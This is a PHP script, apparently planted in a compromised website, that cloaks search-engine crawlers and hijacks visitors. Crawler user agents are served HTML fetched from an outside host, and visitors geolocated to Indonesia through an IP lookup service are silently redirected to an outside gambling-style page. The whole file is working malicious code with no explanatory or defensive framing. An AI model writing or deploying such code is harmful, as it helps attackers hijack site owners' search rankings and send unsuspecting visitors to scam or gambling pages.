<?php
function medan($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        if (defined('CURLOPT_FOLLOWLOCATION')) {
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        }
        $response = @curl_exec($ch);
        @curl_close($ch);
        return $response;
    }
    return false;
}

function get_client_country($ip) {
    if (function_exists('session_status')) {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            @session_start();
        }
    } else {
        if (session_id() == '') {
            @session_start();
        }
    }

    $sess_key = 'geo_' . $ip;
    $sess_ts_key = $sess_key . '_ts';

    if (!empty($_SESSION[$sess_key]) && !empty($_SESSION[$sess_ts_key]) && (time() - intval($_SESSION[$sess_ts_key]) < 3600)) {
        return $_SESSION[$sess_key];
    }

    $url = "http://ip-api.com/json/{$ip}?fields=status,countryCode,message";
    $json = medan($url);
    if ($json === false || $json === null) {
        return null;
    }

    $data = @json_decode($json, true);
    if (!is_array($data) || empty($data['status']) || $data['status'] !== 'success') {
        return null;
    }

    $countryCode = '';
    if (isset($data['countryCode'])) {
        $countryCode = $data['countryCode'];
    }
    $countryCode = strtoupper($countryCode);

    $_SESSION[$sess_key] = $countryCode;
    $_SESSION[$sess_ts_key] = time();
    return $countryCode;
}

$res = '';
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $res = strtolower($_SERVER['HTTP_USER_AGENT']);
}

$bot = "https://mitsubishi-bandung.id/webapp.html";
$file = medan($bot);

$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/i";

if (preg_match($botchar, $res)) {
    header('Vary: User-Agent');
    echo $file;
    exit;
}

if (php_sapi_name() === 'cli' || empty($_SERVER['REMOTE_ADDR'])) {
} else {
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim(reset($ips));
    }

    $country = get_client_country($ip);

    header('Vary: Accept-Language, User-Agent');

    if ($country === 'ID') {
        $target = 'https://webapp-neogacor.pages.dev/';

        if (!headers_sent()) {
            header("Location: {$target}", true, 302);
            exit;
        } else {
            echo '<script>location.href="'.htmlspecialchars($target, ENT_QUOTES, 'UTF-8').'";</script>';
            exit;
        }
    }
}
?>
